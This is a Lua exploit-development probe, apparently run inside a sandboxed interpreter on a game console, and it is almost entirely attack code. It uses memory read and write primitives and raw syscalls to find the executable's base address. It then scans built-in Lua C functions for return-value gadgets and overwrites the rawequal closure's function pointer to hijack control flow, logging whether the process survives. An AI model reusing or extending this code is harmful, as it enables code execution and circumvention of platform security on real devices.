-- CRASH_CLASS: LOW
-- PROBE 56d3: CClosure gadget — find ret-N from known function bodies (v4)
--
-- v2/v3 scanned early eboot (0..256KB) — zero mov eax,N;ret found.
-- The Lua C functions live at eboot+0x1A6770 area (rawequal offset).
-- Their epilogue IS the "return 1" gadget we need.
-- Strategy: read byte dumps of known Lua C functions, find their
-- return instruction pattern, use those as gadgets.

print("=== PROBE 56d3: RETCOUNT v4 — FUNCTION EPILOGUES ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    if type(v) == "string" then return '"' .. v .. '"' end
    if type(v) == "boolean" then return tostring(v) end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return tostring(v)
end
local function vtype(v)
    local ok, t = pcall(type, v)
    if ok then return t end return "?"
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

local G_xor = 0x471

local function get_cc(fn, name)
    local s = tostring(fn)
    local a = s:match("0x([0-9a-fA-F]+)") or s:match(": ([0-9a-fA-F]+)$") or s:match(": (%d+)$")
    if not a then return nil end
    local addr = tonumber(a, 16) or tonumber(a)
    if not addr then return nil end
    local fn_ptr = rq(addr + 0x20)
    local fn_addr = N(fn_ptr)
    local fn_off = fn_addr - tlo
    return {name = name, addr = addr, fn = fn, fn_addr = fn_addr, fn_off = fn_off}
end

-- ============ STEP 1: Dump function bodies ============
print("")
print("[1] Lua C function byte dumps")

local funcs = {
    get_cc(rawequal, "rawequal"),
    get_cc(rawget, "rawget"),
    get_cc(rawset, "rawset"),
    get_cc(select, "select"),
    get_cc(tonumber, "tonumber"),
    get_cc(tostring, "tostring"),
    get_cc(pcall, "pcall"),
    get_cc(unpack, "unpack"),
}

local gadgets = {}  -- gadgets[rax_val] = eboot_offset

for _, f in ipairs(funcs) do
    if f then
        print(string.format("  %s: fn=eboot+0x%X", f.name, f.fn_off))

        -- Read 128 bytes of the function
        local bytes = {}
        for i = 0, 127 do
            local dw = rd(f.fn_addr + (i - i % 4))
            if dw then
                local shift = (i % 4) * 8
                bytes[i] = math.floor(dw / (2^shift)) % 256
            else
                bytes[i] = -1
            end
        end

        -- Print hex dump (first 64 bytes)
        local hex = {}
        for i = 0, 63 do
            if bytes[i] >= 0 then
                hex[#hex + 1] = string.format("%02X", bytes[i])
            else
                hex[#hex + 1] = "??"
            end
            if i % 16 == 15 then
                print("    +" .. string.format("%02X", i - 15) .. ": " .. table.concat(hex, " "))
                hex = {}
            end
        end

        -- Search for patterns in 128 bytes
        for i = 0, 121 do
            -- B8 XX 00 00 00 C3 (mov eax,N;ret)
            if bytes[i] == 0xB8 and bytes[i+2] == 0 and bytes[i+3] == 0
               and bytes[i+4] == 0 and bytes[i+5] == 0xC3 then
                local val = bytes[i+1]
                if val >= 1 and val <= 20 and not gadgets[val] then
                    local off = f.fn_off + i
                    gadgets[val] = off
                    print(string.format("    *** mov eax,%d;ret at fn+%d (eboot+0x%X) ***", val, i, off))
                end
            end
            -- B8 XX 00 00 00 5D C3 (mov eax,N;pop rbp;ret)
            if bytes[i] == 0xB8 and bytes[i+2] == 0 and bytes[i+3] == 0
               and bytes[i+4] == 0 and bytes[i+5] == 0x5D and bytes[i+6] == 0xC3 then
                local val = bytes[i+1]
                if val >= 1 and val <= 20 and not gadgets[val] then
                    local off = f.fn_off + i
                    gadgets[val] = off
                    print(string.format("    *** mov eax,%d;pop rbp;ret at fn+%d (eboot+0x%X) ***", val, i, off))
                end
            end
            -- 31 C0 C3 (xor eax,eax;ret — already known)
            if bytes[i] == 0x31 and bytes[i+1] == 0xC0 and bytes[i+2] == 0xC3 then
                if not gadgets[0] then
                    gadgets[0] = f.fn_off + i
                    print(string.format("    *** xor eax,eax;ret at fn+%d (eboot+0x%X) ***", i, f.fn_off + i))
                end
            end
            -- 83 C8 01 C3 (or eax,1;ret — sets low bit)
            -- 48 C7 C0 XX 00 00 00 C3 (mov rax,N;ret — REX.W prefix)
            if bytes[i] == 0x48 and bytes[i+1] == 0xC7 and bytes[i+2] == 0xC0
               and bytes[i+4] == 0 and bytes[i+5] == 0 and bytes[i+6] == 0
               and bytes[i+7] == 0xC3 then
                local val = bytes[i+3]
                if val >= 1 and val <= 20 and not gadgets[val] then
                    local off = f.fn_off + i
                    gadgets[val] = off
                    print(string.format("    *** mov rax,%d;ret at fn+%d (eboot+0x%X) ***", val, i, off))
                end
            end
        end
    end
end

collectgarbage("collect")

-- Summary
print("")
print("[2] Gadget inventory")
local found_any = false
for val = 0, 20 do
    if gadgets[val] then
        print(string.format("  rax=%d → eboot+0x%X", val, gadgets[val]))
        found_any = true
    end
end
if not found_any then
    print("  NONE found in function bodies")
end

-- ============ STEP 3: Test found gadgets ============
local re = nil
for _, f in ipairs(funcs) do
    if f and f.name == "rawequal" then re = f; break end
end

if not re then print("ABORT: no rawequal"); return end

local function redir(cc, gadget_off, call_fn)
    if not alive() then return {false, "DEAD"} end
    local saved = rq(cc.addr + 0x20)
    pcall(function() memory.write_qword(cc.addr + 0x20, eaddr(gadget_off)) end)
    local results = {pcall(call_fn)}
    pcall(function() memory.write_qword(cc.addr + 0x20, saved) end)
    return results
end

local function test(label, cc, gadget_off, call_fn)
    local r = redir(cc, gadget_off, call_fn)
    local ok = r[1]
    local parts = {}
    for i = 2, math.min(#r, 10) do
        parts[#parts + 1] = fmt(r[i]) .. "(" .. vtype(r[i]) .. ")"
    end
    print(string.format("  %s: ok=%s nret=%d [%s] alive=%s",
        label, tostring(ok), #r - 1, table.concat(parts, ", "), tostring(alive())))
end

-- Baseline
print("")
print("[3] Tests")
test("rax=0 re(1,2)", re, G_xor, function() return rawequal(1, 2) end)

for _, val in ipairs({1, 2, 3, 4, 5}) do
    if gadgets[val] and alive() then
        print(string.format("  --- rax=%d (eboot+0x%X) ---", val, gadgets[val]))
        test("re(111,222)", re, gadgets[val], function() return rawequal(111, 222) end)
        test("re('A','B')", re, gadgets[val], function() return rawequal("A", "B") end)
        test("re()",        re, gadgets[val], function() return rawequal() end)
    end
end

-- ============ STABILITY ============
print("")
print("[F] Stability")
if alive() then
    print(string.format("  rawequal(1,1)=%s (1,2)=%s",
        tostring(rawequal(1, 1)), tostring(rawequal(1, 2))))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d3 COMPLETE ===")
